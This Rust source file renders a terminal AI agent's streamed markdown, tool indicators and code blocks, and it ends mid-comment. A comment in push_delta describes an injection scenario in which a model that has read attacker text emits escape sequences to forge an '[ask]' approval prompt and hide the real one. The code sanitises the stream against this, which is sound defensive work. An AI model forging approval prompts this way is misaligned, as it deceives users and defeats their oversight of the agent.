//! Terminal rendering: streaming markdown renderer (syntect highlighting + termimad), tool-call
//! indicators, todo-list display, and helpers for one-off CLI status/error messages. Owns the
//! embedded Monokai Extended theme used for code blocks.

use std::{
    io::{self, Write},
    sync::{LazyLock, OnceLock},
};

mod markdown;

use crossterm::style::{Attribute, Color, Stylize};
use regex::Regex;
use syntect::{
    easy::HighlightLines,
    highlighting::{FontStyle, Theme, ThemeSet},
    parsing::{Scope, SyntaxReference, SyntaxSet},
    util::{LinesWithEndings, as_24_bit_terminal_escaped},
};
use termimad::{Alignment, MadSkin};

/// Monokai Extended theme, vendored from bat's `sharkdp/sublime-monokai-extended` (MIT).
const MONOKAI_EXTENDED_TMTHEME: &[u8] = include_bytes!("../assets/themes/Monokai Extended.tmTheme");

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum LastOutput {
    Nothing,
    Prompt,
    Text,
    Thinking,
    ToolIndicator,
    TodoList,
}

/// Tracks what was last printed to decide if a blank line is needed next.
///
/// `Copy` so [`crate::console`] can run a transition against a scratch copy and return both the
/// blank line it implies and the state that follows, which is what lets the console's whole
/// decision be a pure function a test can enumerate.
#[derive(Clone, Copy)]
pub struct OutputSpacing {
    last: LastOutput,
}

impl OutputSpacing {
    pub fn new() -> Self {
        Self {
            last: LastOutput::Nothing,
        }
    }

    /// Call before printing streamed text. Returns true if a blank line should be emitted first.
    pub fn before_text(&mut self) -> bool {
        let need_blank = matches!(self.last, LastOutput::ToolIndicator | LastOutput::Thinking);
        self.last = LastOutput::Text;
        need_blank
    }

    /// Call before printing a tool indicator. Returns true if a blank line should be emitted first.
    ///
    /// Two adjacent indicators normally sit flush, which is what makes a run of them read as a list
    /// of steps. Under [`ToolParams::Full`] each one is a multi-line block instead, so flush means
    /// the next `[tool ...]` header butts against the previous call's last argument and the two
    /// read as one call with too many parameters.
    pub fn before_tool_indicator(&mut self, params: ToolParams) -> bool {
        let need_blank = match self.last {
            LastOutput::Text | LastOutput::Thinking => true,
            LastOutput::ToolIndicator => params == ToolParams::Full,
            _ => false,
        };
        self.last = LastOutput::ToolIndicator;
        need_blank
    }

    /// Call before printing a thinking block. Returns true if a blank line should be emitted first.
    pub fn before_thinking(&mut self) -> bool {
        let need_blank = matches!(self.last, LastOutput::Text | LastOutput::ToolIndicator);
        self.last = LastOutput::Thinking;
        need_blank
    }

    /// Call after the todo list is rendered (it has its own trailing newline).
    pub fn after_todo_list(&mut self) {
        self.last = LastOutput::TodoList;
    }

    /// Call after newline_after_prompt is printed.
    pub fn after_prompt(&mut self) {
        self.last = LastOutput::Prompt;
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, serde::Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum RenderMode {
    /// syntect-based highlighter. Named after the `syntect` crate that does the in-process
    /// highlighting. Shows the markdown source as the model wrote it, reflowing nothing, so a wide
    /// table runs past the terminal edge.
    Syntect,
    /// Rendered CommonMark, reflowed to the terminal (default).
    ///
    /// The default because meka's own output is table-heavy: `task_list`, `scratchpad_list`, and
    /// anything the model formats as a table all wrap inside their box here and run off the right
    /// edge under `syntect`. Reading rendered prose is also the common case; wanting to see the
    /// markers is the exception, and `syntect` is one config line away.
    ///
    /// `rich` is accepted as an alias in all three tiers. `FromStr` took it from the day the mode
    /// was named, so `--render-mode rich` and `MEKA_RENDER_MODE=rich` worked while the identical
    /// value in `config.toml` was rejected by serde with an error naming variants the user had just
    /// read an alias for.
    #[default]
    #[serde(alias = "rich")]
    Termimad,
    Raw,
    /// Emits no output to stdout/stderr. Used by sub-agents and any other in-process
    /// [`crate::agent::Agent`] that shouldn't leak to the user's terminal. The
    /// [`StreamingRenderer`] no-ops for this mode and the `render::*` helpers short-circuit on
    /// `matches!(mode, RenderMode::Silent)` at each call site.
    Silent,
}

impl std::fmt::Display for RenderMode {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            RenderMode::Syntect => write!(formatter, "syntect"),
            RenderMode::Termimad => write!(formatter, "termimad"),
            RenderMode::Raw => write!(formatter, "raw"),
            RenderMode::Silent => write!(formatter, "silent"),
        }
    }
}

/// How much of a tool call's input the tool indicator shows.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, serde::Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ToolParams {
    /// Name only: `[tool Shell]`. The only setting under which a model-supplied string never
    /// reaches the terminal at all.
    Off,
    /// Name plus the one argument [`resolve_primary_param`] picks out, on one line (default).
    #[default]
    Summary,
    /// Every argument, as an indented block under the name. See [`render_tool_params`].
    Full,
}

impl std::fmt::Display for ToolParams {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ToolParams::Off => write!(formatter, "off"),
            ToolParams::Summary => write!(formatter, "summary"),
            ToolParams::Full => write!(formatter, "full"),
        }
    }
}

impl std::str::FromStr for RenderMode {
    type Err = String;

    fn from_str(string: &str) -> std::result::Result<Self, Self::Err> {
        match string.to_lowercase().as_str() {
            "syntect" => Ok(RenderMode::Syntect),
            "rich" | "termimad" => Ok(RenderMode::Termimad),
            "raw" => Ok(RenderMode::Raw),
            "silent" => Ok(RenderMode::Silent),
            other => Err(format!(
                "unknown render mode '{}' (expected 'syntect', 'termimad', 'raw', or 'silent')",
                other
            )),
        }
    }
}

pub struct StreamingRenderer {
    buffer: String,
    skin: MadSkin,
    mode: RenderMode,
    pub(crate) started: bool,
    raw_table_lines: Vec<String>,
    code_block_lines: Vec<String>,
    /// Fixed render width for the termimad path. `None` in production, where the real terminal
    /// width is the right answer; tests set it so their expected output doesn't depend on the
    /// terminal the suite happens to run under.
    width: Option<usize>,
}

impl StreamingRenderer {
    pub fn new(mode: RenderMode) -> Self {
        Self {
            buffer: String::new(),
            // Only the termimad path renders through the skin, and building it forces the ~1 MB
            // syntax-set load. `Raw` and `Silent` otherwise never touch syntect at all, and
            // `Silent` is what sub-agents run under.
            skin: match mode {
                RenderMode::Termimad => markdown_skin().clone(),
                _ => MadSkin::default(),
            },
            mode,
            started: false,
            raw_table_lines: Vec::new(),
            code_block_lines: Vec::new(),
            width: None,
        }
    }

    /// Pin the render width instead of reading the terminal's. Test-only: production always wants
    /// the live width.
    #[cfg(test)]
    fn with_width(mut self, width: usize) -> Self {
        self.width = Some(width);
        self
    }

    pub fn push_delta(&mut self, delta: &str) -> io::Result<()> {
        // Short-circuit before any buffering; Silent shouldn't even accumulate state since
        // `finish` will discard it anyway.
        if matches!(self.mode, RenderMode::Silent) {
            return Ok(());
        }

        // Streamed assistant text is the largest model-controlled surface meka prints, and it was
        // the only one arriving unfiltered: the tool indicator, thinking block, todo list and
        // approval prompt all sanitise, and each has a regression test for the forgery it prevents.
        // The markdown renderer is not a defence -- termimad emits a `Compound`'s bytes verbatim
        // and syntect writes the source slice through -- so a model that has read attacker
        // text could clear the screen and repaint a convincing `[ask]` block, then let the
        // real prompt scroll past invisibly behind a leaked `\x1b[8m`. Sanitising here
        // covers every render mode and every caller, rather than at each of the three mode
        // arms below.
        let sanitized = sanitize_stream_text(delta);
        let delta = sanitized.as_str();

        let delta = if self.started {
            delta
        } else {
            let trimmed = delta.trim_start_matches('\n');
            if trimmed.is_empty() {
                return Ok(());
            }
            self.started = true;
            trimmed
        };

        self.buffer.push_str(delta);

        match self.mode {
            RenderMode::Syntect => self.flush_syntect(),
            RenderMode::Termimad => self.flush_termimad(),
            RenderMode::Raw => self.flush_raw(),
            RenderMode::Silent => Ok(()),
        }
    }

    pub fn finish(&mut self) -> io::Result<()> {
        if matches!(self.mode, RenderMode::Silent) {
            return Ok(());
        }
        match self.mode {
            RenderMode::Syntect => {
                {
                    let remaining = std::mem::take(&mut self.buffer);
                    let trimmed = remaining.trim_end_matches('\n');
                    let mut needs_newline = false;
                    for line in trimmed.lines() {
                        let is_fence = line.trim_start().starts_with("```");

                        if !self.code_block_lines.is_empty() {
                            self.code_block_lines.push(line.to_string());
                            if is_fence {
                                self.flush_syntect_code_block()?;
                                needs_newline = false;
                            }
                        } else if is_fence {
                            self.flush_syntect_table()?;
                            self.code_block_lines.push(line.to_string());
                            needs_newline = false;
                        } else if is_table_line(line) {
                            self.raw_table_lines.push(line.to_string());
                            needs_newline = false;
                        } else if line.is_empty() {
                            self.flush_syntect_table()?;
                            println!();
                            needs_newline = false;
                        } else {
                            self.flush_syntect_table()?;
                            print_highlighted_markdown(line);
                            needs_newline = true;
                        }
                    }
                    // Deliberately not gated on a non-empty buffer. A turn whose last delta ended
                    // in a newline leaves the buffer empty while a table or an unterminated fence
                    // is still pending, and skipping these drains discarded it: a reply ending in a
                    // markdown table lost the table entirely.
                    self.flush_syntect_code_block()?;
                    self.flush_syntect_table()?;
                    if needs_newline {
                        println!();
                    }
                }
            }
            RenderMode::Termimad => {
                // Not gated on a non-empty buffer: an unterminated fence whose lines have all been
                // consumed leaves the buffer empty and the block pending, and skipping the drain
                // here would discard it.
                let remaining = std::mem::take(&mut self.buffer);
                let trimmed = remaining.trim_end_matches('\n');
                let output = self.finish_termimad_output(trimmed);
                if !output.is_empty() {
                    print!("{}", output);
                }
            }
            RenderMode::Raw => {
                // Same reason the other arms aren't gated on a non-empty buffer: a reply ending in
                // a table leaves the rows pending with nothing left in the buffer, and skipping the
                // drain printed no table at all.
                let remaining = std::mem::take(&mut self.buffer);
                let trimmed = remaining.trim_end_matches('\n');
                for line in trimmed.lines() {
                    if is_table_line(line) {
                        self.raw_table_lines.push(line.to_string());
                    } else {
                        self.flush_raw_table()?;
                        println!("{}", line);
                    }
                }
                self.flush_raw_table()?;
            }
            // Already short-circuited above; included for exhaustiveness.
            RenderMode::Silent => {}
        }
        io::stdout().flush()
    }

    fn flush_syntect(&mut self) -> io::Result<()> {
        self.buffer = normalize_spacing(&self.buffer, !self.code_block_lines.is_empty());

        while let Some(newline_pos) = self.buffer.find('\n') {
            let line = self.buffer[..newline_pos].to_string();
            let is_fence = line.trim_start().starts_with("```");

            // If we're inside a code block, accumulate lines
            if !self.code_block_lines.is_empty() {
                self.buffer = self.buffer[newline_pos + 1..].to_string();
                self.code_block_lines.push(line);
                if is_fence {
                    self.flush_syntect_code_block()?;
                }
                continue;
            }

            // Opening fence starts a new code block
            if is_fence {
                self.buffer = self.buffer[newline_pos + 1..].to_string();
                self.flush_syntect_table()?;
                self.code_block_lines.push(line);
                continue;
            }

            self.buffer = self.buffer[newline_pos + 1..].to_string();

            if is_table_line(&line) {
                self.raw_table_lines.push(line);
            } else {
                self.flush_syntect_table()?;
                if line.is_empty() {
                    println!();
                } else {
                    print_highlighted_markdown(&format!("{}\n", line));
                }
                io::stdout().flush()?;
            }
        }
        Ok(())
    }

    fn flush_syntect_code_block(&mut self) -> io::Result<()> {
        if self.code_block_lines.is_empty() {
            return Ok(());
        }
        let lines = std::mem::take(&mut self.code_block_lines);
        print!("{}", render_code_block_to_string(&lines));
        io::stdout().flush()
    }

    fn flush_syntect_table(&mut self) -> io::Result<()> {
        if self.raw_table_lines.is_empty() {
            return Ok(());
        }

        let lines = std::mem::take(&mut self.raw_table_lines);
        let formatted = format_table(&lines);
        let table_text = formatted.join("\n");
        print_highlighted_markdown(&table_text);
        println!();
        io::stdout().flush()
    }

    /// Render markdown prose through termimad.
    ///
    /// Split out from the flush path so tests can assert on the rendered string; `term_text` reads
    /// the real terminal width, so the tests pass an explicit one to stay deterministic.
    fn termimad_to_string(&self, markdown: &str) -> String {
        // Parsed by meka, not by minimad: see `render::markdown`. termimad still lays the result
        // out and applies the skin, but the text it receives carries no markup, so nothing depends
        // on minimad's dialect matching what the model wrote.
        let document = markdown::MarkdownDoc::parse(markdown);
        let width = self.width.or_else(|| {
            // Only wrap when there is a real terminal to wrap to. With stdout redirected,
            // `termimad::terminal_size()` reports a 50-column fallback, and reflowing an answer to
            // 50 columns on its way into a file or another tool is narrower than anyone asked for.
            // `None` tells termimad not to reflow at all, which is what an unbounded sink wants.
            std::io::IsTerminal::is_terminal(&std::io::stdout())
                .then(|| termimad::terminal_size().0 as usize)
        });
        format!(
            "{}",
            termimad::FmtText::from_text(&self.skin, document.to_minimad(), width)
        )
    }

    /// Flush the termimad path, keeping fenced code blocks away from termimad.
    ///
    /// Code blocks are pulled out and rendered by [`render_code_block_to_string`], the same
    /// syntect-backed renderer the `syntect` mode uses, because termimad paints a block in one flat
    /// colour with no regard for its language. Segmenting on fences also fixes a bug the previous
    /// paragraph-splitting loop had: it broke on every `\n\n` with no fence guard, so a code block
    /// containing a blank line was cut in half and each half handed to termimad separately, which
    /// left the fence unbalanced.
    fn flush_termimad(&mut self) -> io::Result<()> {
        let output = self.take_termimad_output();
        if !output.is_empty() {
            print!("{}", output);
            io::stdout().flush()?;
        }
        Ok(())
    }

    /// Consume whatever of the buffer is renderable and return it, leaving anything still being
    /// streamed behind. Separated from the printing so tests can assert on real output instead of
    /// smoke-testing that a render didn't panic.
    fn take_termimad_output(&mut self) -> String {
        let mut output = String::new();
        self.buffer = normalize_spacing(&self.buffer, !self.code_block_lines.is_empty());

        // Every iteration below either stops or strictly consumes from the buffer, so the loop
        // terminates. This tracks that invariant rather than trusting it: the cost of getting it
        // wrong is a frozen REPL, and it has been wrong once already (a partial-looking table row
        // ahead of a fence was handed back to the buffer, leaving the loop where it started).
        // Stopping early is harmless, since `finish` drains whatever is left.
        let mut buffered_before = usize::MAX;

        loop {
            if self.buffer.len() >= buffered_before {
                tracing::debug!(
                    "termimad flush made no progress on {} buffered bytes; deferring to finish",
                    self.buffer.len()
                );
                break;
            }
            buffered_before = self.buffer.len();

            // Inside a block: accumulate whole lines until the closing fence arrives.
            if !self.code_block_lines.is_empty() {
                let Some(newline_pos) = self.buffer.find('\n') else {
                    break;
                };
                let line = self.buffer[..newline_pos].to_string();
                self.buffer = self.buffer[newline_pos + 1..].to_string();
                let closes = is_code_fence(&line);
                self.code_block_lines.push(line);
                if closes {
                    output.push_str(&self.take_code_block());
                }
                continue;
            }

            // Outside a block: hand everything up to the next opening fence to termimad, then take
            // the fence itself. A fence only counts once its line is complete, otherwise a partial
            // "``" at the buffer's end would be mistaken for prose.
            match self.next_fence_offset() {
                Some(offset) => {
                    if offset > 0 {
                        let prose = self.buffer[..offset].to_string();
                        self.buffer = self.buffer[offset..].to_string();
                        // Complete: a fence follows, so nothing more can be appended to this
                        // segment and none of it may be held back. Holding any of it would also
                        // put it straight back into the buffer ahead of the fence, leaving the
                        // loop in the state it started in and spinning forever.
                        output.push_str(&self.take_prose_output(&prose, true));
                        continue;
                    }
                    let Some(newline_pos) = self.buffer.find('\n') else {
                        break;
                    };
                    let fence = self.buffer[..newline_pos].to_string();
                    self.buffer = self.buffer[newline_pos + 1..].to_string();
                    self.code_block_lines.push(fence);
                }
                None => {
                    // Not complete: the turn may still stream more text onto the end of this, so a
                    // partial table or a partial line goes back into the buffer to be finished.
                    let prose = std::mem::take(&mut self.buffer);
                    output.push_str(&self.take_prose_output(&prose, false));
                    break;
                }
            }
        }

        output
    }

    /// Byte offset of the next line that opens a code fence, or `None` when the buffer holds no
    /// complete fence line. Only complete lines count, so a fence still being streamed stays in the
    /// buffer rather than being flushed as prose.
    fn next_fence_offset(&self) -> Option<usize> {
        let mut offset = 0;
        for line in self.buffer.split_inclusive('\n') {
            if !line.ends_with('\n') {
                return None;
            }
            if is_code_fence(line) {
                return Some(offset);
            }
            offset += line.len();
        }
        None
    }

    /// Render prose, holding back anything whose meaning later text could still change.
    ///
    /// Markdown is retroactive: `Title` is a paragraph until a following `===` makes it a heading,
    /// `| a | b |` is a paragraph until a following `|---|` makes it a table header, and a list
    /// keeps absorbing lines until a non-list one arrives. So a line cannot be rendered the moment
    /// it completes; it can only be rendered once no later text can reinterpret it.
    ///
    /// A blank line is that point. No block construct spans one -- a setext underline and a table
    /// delimiter must both follow immediately -- so everything before the last blank line is
    /// settled, and everything after it is still open. Flushing at blank lines therefore renders
    /// whole blocks, which is also what lets a paragraph reflow to the terminal width instead of
    /// keeping whatever line breaks the model wrote.
    ///
    /// `segment_is_complete` overrides this: when the caller has already found the fence that ends
    /// the segment, nothing can be appended to it, so all of it renders. Returning any of it would
    /// also put it back in front of that fence and leave the flush loop where it started.
    fn take_prose_output(&mut self, prose: &str, segment_is_complete: bool) -> String {
        if prose.is_empty() {
            return String::new();
        }
        if segment_is_complete {
            return self.termimad_to_string(prose);
        }
        match prose.rfind("\n\n") {
            Some(boundary) => {
                let (settled, open) = prose.split_at(boundary + 2);
                self.buffer.insert_str(0, open);
                self.termimad_to_string(settled)
            }
            None => {
                self.buffer.insert_str(0, prose);
                String::new()
            }
        }
    }

    /// Drain the tail at end-of-turn. A fence still open here (a truncated response, an
    /// interrupted stream) has its remaining lines rendered as code rather than dropped.
    ///
    /// Prose is accumulated and rendered in one go rather than line by line, for the same reason
    /// the streaming path flushes whole blocks: a table handed to the renderer a row at a time
    /// becomes a separate single-row table per line, with misaligned columns and no wrapping. A
    /// reply that ends with a table lands here, because a trailing table is held back for the
    /// stream to finish.
    fn finish_termimad_output(&mut self, trimmed: &str) -> String {
        let mut output = String::new();
        let mut prose = String::new();
        for line in trimmed.lines() {
            if !self.code_block_lines.is_empty() {
                let closes = is_code_fence(line);
                self.code_block_lines.push(line.to_string());
                if closes {
                    output.push_str(&self.take_code_block());
                }
            } else if is_code_fence(line) {
                if !prose.is_empty() {
                    output.push_str(&self.termimad_to_string(&std::mem::take(&mut prose)));
                }
                self.code_block_lines.push(line.to_string());
            } else {
                prose.push_str(line);
                prose.push('\n');
            }
        }
        if !prose.is_empty() {
            output.push_str(&self.termimad_to_string(&prose));
        }
        output.push_str(&self.take_code_block());
        output
    }

    fn take_code_block(&mut self) -> String {
        if self.code_block_lines.is_empty() {
            return String::new();
        }
        let lines = std::mem::take(&mut self.code_block_lines);
        render_code_block_to_string(&lines)
    }

    fn flush_raw(&mut self) -> io::Result<()> {
        self.buffer = normalize_spacing(&self.buffer, false);

        while let Some(newline_pos) = self.buffer.find('\n') {
            let line = self.buffer[..newline_pos].to_string();
            self.buffer = self.buffer[newline_pos + 1..].to_string();

            if is_table_line(&line) {
                self.raw_table_lines.push(line);
            } else {
                self.flush_raw_table()?;
                println!("{}", line);
                io::stdout().flush()?;
            }
        }
        Ok(())
    }

    fn flush_raw_table(&mut self) -> io::Result<()> {
        if self.raw_table_lines.is_empty() {
            return Ok(());
        }

        let lines = std::mem::take(&mut self.raw_table_lines);
        let formatted = format_table(&lines);
        for line in &formatted {
            println!("{}", line);
        }
        io::stdout().flush()
    }
}

/// Ensure blank lines after markdown headers and tables when followed by non-empty content. Skips
/// content inside code fences.
fn normalize_spacing(text: &str, starts_inside_fence: bool) -> String {
    let lines: Vec<&str> = text.lines().collect();
    let mut result = Vec::with_capacity(lines.len());
    // The caller may already have consumed an opening fence out of the buffer, in which case these
    // lines are a code-block body even though nothing here says so. Assuming otherwise rewrites the
    // user's code: a `# comment` line reads as a markdown header and gets a blank line inserted
    // after it, inside their snippet.
    let mut in_fence = starts_inside_fence;

    for (index, line) in lines.iter().enumerate() {
        if line.trim_start().starts_with("```") {
            in_fence = !in_fence;
        }

        result.push(*line);

        if in_fence {
            continue;
        }

        let next_line = lines.get(index + 1);
        let next_is_non_empty = next_line.is_some_and(|next| !next.trim().is_empty());

        if !next_is_non_empty {
            continue;
        }

        let trimmed = line.trim_start();

        // Blank line after headers (e.g., `## Title`)
        let is_header = trimmed.starts_with('#')
            && trimmed
                .find(|character: char| character != '#')
                .is_some_and(|position| trimmed.as_bytes().get(position) == Some(&b' '));

        // Blank line after table rows when next line is clearly not a table row. A line starting
        // with `|` might be an incomplete table row from streaming, so only treat lines NOT
        // starting with `|` as table-ending.
        let is_table_end = is_table_line(line)
            && next_line.is_some_and(|next| !next.trim_start().starts_with('|'));

        if is_header || is_table_end {
            result.push("");
        }
    }

    // Preserve trailing newline if the original had one
    let mut output = result.join("\n");
    if text.ends_with('\n') {
        output.push('\n');
    }
    output
}

/// Holds the expensive-to-load syntect assets, a `SyntaxSet` (~1 MB bincode blob) and a dark
/// `Theme`, so subsequent highlighting calls can reuse them without paying the decode cost each
/// time. Session-resume reprint and live streaming both highlight per line;
/// initializing assets once per process turns that cost from ~50 ms/call into <1 ms/call.
struct Highlighter {
    syntax_set: SyntaxSet,
    theme: Theme,
}

static HIGHLIGHTER: OnceLock<Highlighter> = OnceLock::new();

// The `expect()` below loads a compile-time `include_bytes!()` of the bundled theme; a parse
// failure would mean we shipped a corrupt `.tmTheme` resource, caught on the first build/test.
#[allow(clippy::expect_used)]
fn highlighter() -> &'static Highlighter {
    HIGHLIGHTER.get_or_init(|| {
        let syntax_set = SyntaxSet::load_defaults_newlines();
        let mut cursor = std::io::Cursor::new(MONOKAI_EXTENDED_TMTHEME);
        let theme =
            ThemeSet::load_from_reader(&mut cursor).expect("embedded Monokai Extended theme loads");
        Highlighter { syntax_set, theme }
    })
}

/// The termimad skin, derived from the same theme the syntect path highlights with.
///
/// Cached because [`syntect::highlighting::Highlighter::style_for_stack`] documents itself as
/// "convenient but expensive", and a skin is otherwise rebuilt per renderer (one per turn, plus one
/// per message when reprinting history).
static MARKDOWN_SKIN: OnceLock<MadSkin> = OnceLock::new();

/// The context scope a markdown document is highlighted under. Several of the theme's markdown
/// rules are nested selectors (`text.html.markdown markup.raw.inline`), which only match when this
/// sits below the element scope on the stack; looking the element up alone silently falls through
/// to the default foreground.
const MARKDOWN_CONTEXT_SCOPE: &str = "text.html.markdown";

/// Resolve a TextMate scope stack against the embedded theme.
///
/// Returns `None` for a scope the theme doesn't style or that fails to parse, so a caller falls
/// back to termimad's own default for that element rather than to an invented colour.
fn theme_style(scope: &str) -> Option<(Option<Color>, FontStyle)> {
    let theme = &highlighter().theme;
    let highlighter = syntect::highlighting::Highlighter::new(theme);
    let stack = [
        Scope::new(MARKDOWN_CONTEXT_SCOPE).ok()?,
        Scope::new(scope).ok()?,
    ];
    let style = highlighter.style_for_stack(&stack);
    let foreground = style.foreground;
    // syntect hands back the enclosing context's foreground for an unmatched scope. Passing that
    // through would paint every element the same colour, so treat "same as the context" as
    // "unstyled" and leave termimad's default in place.
    let default_foreground = highlighter
        .style_for_stack(&[Scope::new(MARKDOWN_CONTEXT_SCOPE).ok()?])
        .foreground;
    let color = (foreground != default_foreground).then_some(Color::Rgb {
        r: foreground.r,
        g: foreground.g,
        b: foreground.b,
    });
    Some((color, style.font_style))
}

/// Apply a scope's colour and font style to one `CompoundStyle`, keeping whatever termimad already
/// set for anything the theme is silent about.
fn apply_scope(style: &mut termimad::CompoundStyle, scope: &str) {
    let Some((color, font_style)) = theme_style(scope) else {
        return;
    };
    if let Some(color) = color {
        style.set_fg(color);
    }
    if font_style.contains(FontStyle::BOLD) {
        style.add_attr(Attribute::Bold);
    }
    if font_style.contains(FontStyle::ITALIC) {
        style.add_attr(Attribute::Italic);
    }
    if font_style.contains(FontStyle::UNDERLINE) {
        style.add_attr(Attribute::Underlined);
    }
}

/// Foreground colour for a scope, for the fields that are a styled character rather than a span.
fn scope_color(scope: &str) -> Option<Color> {
    theme_style(scope).and_then(|(color, _)| color)
}

/// Build the markdown skin from the embedded theme.
///
/// termimad's `default_dark()` is defined entirely in `gray(n)`, so out of the box every element
/// renders in the same four greyscale tones and the mode is unreadable. The theme meka already
/// ships for syntect defines all of these elements (`markup.heading`, `markup.bold`, …), so reading
/// them from there gives termimad the same visual language as the syntect mode *and* keeps the two
/// in sync automatically if the theme is ever swapped.
fn markdown_skin() -> &'static MadSkin {
    MARKDOWN_SKIN.get_or_init(|| {
        let mut skin = MadSkin::default_dark();

        apply_scope(&mut skin.bold, "markup.bold");
        apply_scope(&mut skin.italic, "markup.italic");
        apply_scope(&mut skin.strikeout, "markup.strike");
        apply_scope(&mut skin.inline_code, "markup.raw.inline");
        apply_scope(&mut skin.code_block.compound_style, "markup.raw.block");

        if let Some(color) = scope_color("markup.heading") {
            skin.set_headers_fg(color);
        }
        for header in &mut skin.headers {
            // `MadSkin::default()` centres the first header. Centring a heading mid-transcript
            // reads as a formatting glitch rather than structure.
            header.align = Alignment::Left;
        }

        if let Some(color) = scope_color("punctuation.definition.list_item.markdown") {
            skin.bullet.set_fg(color);
        }
        if let Some(color) = scope_color("markup.quote") {
            skin.quote_mark.set_fg(color);
        }
        // Borders and rules are structure, not content. `markup.table` in this theme is a saturated
        // red that competes with the cells it frames, so the comment colour (the theme's own
        // "recede into the background" tone) is the better fit.
        if let Some(color) = scope_color("comment") {
            skin.table.compound_style.set_fg(color);
            skin.horizontal_rule.set_fg(color);
            skin.ellipsis.set_fg(color);
        }

        // Foreground only, matching the syntect path, which renders with
        // `as_24_bit_terminal_escaped(.., false)` and so never emits a background. A hardcoded dark
        // background would fight any terminal not already using one.
        skin.inline_code.object_style.background_color = None;
        skin.code_block.compound_style.object_style.background_color = None;

        skin
    })
}

/// Syntax-highlight a chunk of markdown and write it to stdout with 24-bit ANSI color escapes. The
/// caller is responsible for any surrounding newlines.
fn print_highlighted_markdown(text: &str) {
    let output = highlight_markdown_to_string(text);
    print!("{}", output);
}

/// Returns the ANSI-escaped highlighted text without writing to stdout. Exposed for testing.
fn highlight_markdown_to_string(text: &str) -> String {
    let highlighter = highlighter();
    let syntax = highlighter
        .syntax_set
        .find_syntax_by_name("Markdown")
        .or_else(|| highlighter.syntax_set.find_syntax_by_extension("md"))
        .unwrap_or_else(|| highlighter.syntax_set.find_syntax_plain_text());
    highlight_with_syntax(text, syntax)
}

/// Highlight `text` line-by-line with an explicit syntect grammar and return 24-bit ANSI escapes.
/// Shared core of the Markdown-prose path and the per-language code-block path; the passed `syntax`
/// must come from the same static [`highlighter`] so its context indices match the `syntax_set`
/// used to resolve embeds.
fn highlight_with_syntax(text: &str, syntax: &SyntaxReference) -> String {
    let highlighter = highlighter();
    let mut highlight = HighlightLines::new(syntax, &highlighter.theme);

    let mut out = String::new();
    for line in LinesWithEndings::from(text) {
        match highlight.highlight_line(line, &highlighter.syntax_set) {
            Ok(ranges) => {
                out.push_str(&as_24_bit_terminal_escaped(&ranges[..], false));
            }
            Err(error) => {
                // On parse error, fall back to plain text so we never lose content.
                tracing::debug!("syntect highlight failed: {}", error);
                out.push_str(line);
            }
        }
    }
    // Reset ANSI so colors don't bleed into the next prompt.
    out.push_str("\x1b[0m");
    out
}

/// A markdown code-fence line, e.g. ```` ```rust ```` or a bare ```` ``` ````. Indentation is
/// tolerated.
fn is_code_fence(line: &str) -> bool {
    line.trim_start().starts_with("```")
}

/// Extract the language token from an opening code fence: ```` ```rust ````→`Some("rust")`,
/// ```` ``` ````→`None`, ```` ```rust,ignore ````/```` ```js title=x ````→the first token. The
/// token is whatever precedes the first whitespace or comma after the backticks.
fn parse_fence_language(fence_line: &str) -> Option<&str> {
    let after = fence_line.trim_start().trim_start_matches('`');
    let token = after
        .split(|character: char| character.is_whitespace() || character == ',')
        .next()
        .unwrap_or("")
        .trim();
    (!token.is_empty()).then_some(token)
}

/// Resolve a fence language tag to a syntect grammar, falling back to plain text for an absent or
/// unrecognized tag (which then renders uncolored rather than erroring). `find_syntax_by_token` is
/// already case-insensitive on both extension and grammar name in syntect 5.x, so lowercase tags
/// like `rust`/`python`/`json` resolve directly; the alias arm only covers tags that are neither a
/// file extension nor a grammar name.
fn syntax_for_language(lang: Option<&str>) -> &'static SyntaxReference {
    let set = &highlighter().syntax_set;
    let Some(lang) = lang.map(str::trim).filter(|value| !value.is_empty()) else {
        return set.find_syntax_plain_text();
    };
    let resolved = match lang.to_ascii_lowercase().as_str() {
        "text" | "plain" | "plaintext" => Some(set.find_syntax_plain_text()),
        "shell" | "console" => set.find_syntax_by_extension("sh"),
        _ => set.find_syntax_by_token(lang),
    };
    resolved.unwrap_or_else(|| set.find_syntax_plain_text())
}

/// Render a fenced code block to ANSI-highlighted text. `lines` is
/// `[opening_fence, body…, closing_fence?]` (the closing fence is absent when the stream ended
/// mid-block). The fence lines keep the Markdown coloring they've always had; the body is
/// highlighted with the block's own language grammar (falling back to plain text for an
/// absent/unknown tag). Every line ends in a single `\n`, matching the prior `join("\n")` +
/// `println!()` output.
fn render_code_block_to_string(lines: &[String]) -> String {
    if lines.is_empty() {
        return String::new();
    }
    let language = parse_fence_language(&lines[0]);
    let has_closing = lines.len() > 1 && is_code_fence(&lines[lines.len() - 1]);
    let body_end = if has_closing {
        lines.len() - 1
    } else {
        lines.len()
    };

    let mut out = highlight_markdown_to_string(&format!("{}\n", lines[0]));
    if body_end > 1 {
        let body: String = lines[1..body_end]
            .iter()
            .map(|line| format!("{}\n", line))
            .collect();
        out.push_str(&highlight_with_syntax(&body, syntax_for_language(language)));
    }
    if has_closing {
        out.push_str(&highlight_markdown_to_string(&format!(
            "{}\n",
            lines[body_end]
        )));
    }
    out
}

fn is_table_line(line: &str) -> bool {
    let trimmed = line.trim();
    trimmed.starts_with('|') && trimmed.ends_with('|') && trimmed.len() > 1
}

fn is_separator_row(cells: &[String]) -> bool {
    cells.iter().all(|cell| {
        cell.chars()
            .all(|character| character == '-' || character == ':')
    })
}

fn parse_table_row(line: &str) -> Vec<String> {
    let trimmed = line.trim();
    let inner = trimmed
        .strip_prefix('|')
        .unwrap_or(trimmed)
        .strip_suffix('|')
        .unwrap_or(trimmed);
    inner
        .split('|')
        .map(|cell| cell.trim().to_string())
        .collect()
}

pub(crate) fn display_width(string: &str) -> usize {
    // The larger of two measures, because a terminal may follow either and a budget must never be
    // built on the smaller one. `unicode_width` merges an emoji and its skin-tone modifier into one
    // two-column cluster; VTE -- gnome-terminal, Console, Tilix, Terminator -- paints them as two
    // glyphs across four columns, so every skin-toned emoji in an argument was a two-times
    // under-count. Summing per character catches that, and the whole-string measure catches
